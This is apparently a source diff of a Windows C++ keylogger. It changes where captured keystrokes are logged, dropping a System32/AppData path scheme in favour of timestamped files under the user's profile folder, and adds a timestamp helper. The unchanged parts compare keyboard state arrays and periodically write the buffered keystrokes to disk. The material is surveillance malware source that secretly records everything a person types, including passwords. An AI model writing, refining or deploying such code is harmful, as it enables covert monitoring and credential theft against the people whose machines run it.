@@ -3,6 +3,7 @@
 #include <iostream>
 #include <Windows.h>
 #include <winuser.h>
+#include <stdio.h>
 #include <fstream>
 #include <string>
 #include <Lmcons.h>
@@ -56,18 +57,28 @@ string getUsername() {
 	}
 }
 
+string getTimestamp() {
+	string outstr = "";
+	SYSTEMTIME str_t;
+	GetSystemTime(&str_t);
+	outstr += to_string(str_t.wYear);
+	outstr += to_string(str_t.wMonth);
+	outstr += to_string(str_t.wDay);
+	outstr += "-";
+	outstr += to_string(str_t.wMinute);
+	outstr += to_string(str_t.wSecond);
+	return outstr;
+}
+
 int main()
 {
 	// get the path for the users document folder
+	
+	
 	string logpath;
-	string cmdresult = exec("mkdir C:\\Windows\\System32\\lvap.log");
-	if (cmdresult.find("denied") > cmdresult.length()) {
-		exec("mkdir C:\\Users\\" + getUsername() + "\\AppData\\Roaming\\LogData");
-		logpath = "C:\\Users\\" + getUsername() + "\\AppData\\Roaming\\LogData\\keylog.txt";
-	}
-	else {
-		logpath = "C:\\Windows\\System32\\lvap.log";
-	}
+	string homepath = exec("echo|set /p=\"%USERPROFILE%\"");
+	exec("mkdir " + homepath + "\\LogData");
+	logpath = homepath + "\\LogData\\" + getTimestamp() + ".txt";
 
 	int temp;
 	BYTE arr[256];
@@ -112,8 +123,6 @@ int main()
 			arr_prev[i] = arr[i];
 		}
 
-		
-		
 		// writes the logs to a file
 		if (!(repetitions % 1500)) {
 			if (outstring != "" || repetitions == 0) {
@@ -121,7 +130,7 @@ int main()
 				if (fout.is_open()) {
 					cout << "WROTE " << outstring.size() << " BYTES TO " << logpath << endl;
 					if (repetitions == 0) {
-						fout << "\n" << exec("date /t") << exec("time /t");
+						fout << "\n" << getTimestamp() << "\n";
 					}
 					fout << outstring;
 					outstring = "";
@@ -134,4 +143,5 @@ int main()
 		}
 		repetitions = (repetitions + 1) % 7500;
 	}
+
 }
